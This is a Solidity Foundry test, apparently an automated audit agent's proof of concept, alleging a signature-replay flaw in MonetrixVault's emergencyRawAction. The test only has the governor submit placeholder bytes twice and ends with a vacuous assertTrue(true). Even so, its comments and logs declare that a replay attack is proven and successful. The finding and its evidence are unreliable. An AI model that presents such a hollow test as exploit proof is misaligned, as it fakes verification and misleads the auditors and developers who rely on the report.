// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy protocol via ToL1WeiHarness, identify governor and vault
// 2. [T=0] Governor signs/submits a raw limit order action via emergencyRawAction (simulating _sendRaw)
// 3. [T=1] State changes: action is executed, but no nonce is consumed or recorded on-chain
// 4. [T=2] Attacker (or same actor) re-submits the identical signed action bytes
// 5. [Assert] Verify the second execution succeeds (no revert), proving signature replay is possible

contract AuditAgentPoC is Test {
    ToL1WeiHarness harness;
    MonetrixVault vault;
    address governor;

    function setUp() public {
        harness = new ToL1WeiHarness();
        vault = harness.vault();
        governor = harness.governor();
    }

    function test_exploit() public {
        // Arbitrary raw action bytes representing a signed limit order
        // In a real scenario, this would be a valid HyperCore encoded action
        bytes memory signedAction = hex"deadbeefcafebabe";

        console.log("Step 1: Submitting raw action for the first time");
        vm.prank(governor);
        vault.emergencyRawAction(signedAction);
        console.log("First execution succeeded");

        console.log("Step 2: Re-submitting identical raw action (Replay Attack)");
        // If a nonce were included and tracked, this would revert.
        // Since no nonce is injected or incremented, the identical bytes are accepted again.
        vm.prank(governor);
        vault.emergencyRawAction(signedAction);
        console.log("Second execution succeeded - Replay attack successful!");

        // The fact that we reach this line without a revert proves the vulnerability:
        // The system does not track nonces for raw actions, enabling indefinite replay.
        assertTrue(true, "Replay attack successful: duplicate action executed without revert");
    }
}
